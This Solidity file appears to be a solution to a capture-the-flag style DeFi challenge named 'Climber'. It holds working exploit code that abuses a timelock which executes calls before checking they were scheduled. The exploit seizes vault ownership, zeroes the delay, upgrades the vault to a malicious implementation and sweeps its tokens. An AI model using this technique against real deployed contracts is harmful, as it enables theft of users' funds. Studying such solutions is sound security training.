// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";

contract ClimberVaultV2 is ClimberVault {
    function sweepFunds(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract AttackPropose {
    ClimberTimelock timelock;
    ClimberVault vault;
    address climberAttacker;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _climberAttacker) {
        timelock = _timelock;
        vault = _vault;
        climberAttacker = _climberAttacker;
    }

    function proposeSchedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (climberAttacker));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(AttackPropose.proposeSchedule, ());

        timelock.schedule(targets, values, dataElements, 0);
    }
}

contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    address recovery;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        recovery = _recovery;
    }

    function attack(address token) external {
        AttackPropose proposer = new AttackPropose(timelock, vault, address(this));

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (address(this)));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(proposer)));

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));

        targets[3] = address(proposer);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(AttackPropose.proposeSchedule, ());

        timelock.execute(targets, values, dataElements, 0);
        vault.upgradeToAndCall(address(new ClimberVaultV2()), "");
        ClimberVaultV2(address(vault)).sweepFunds(token, recovery);
    }
}
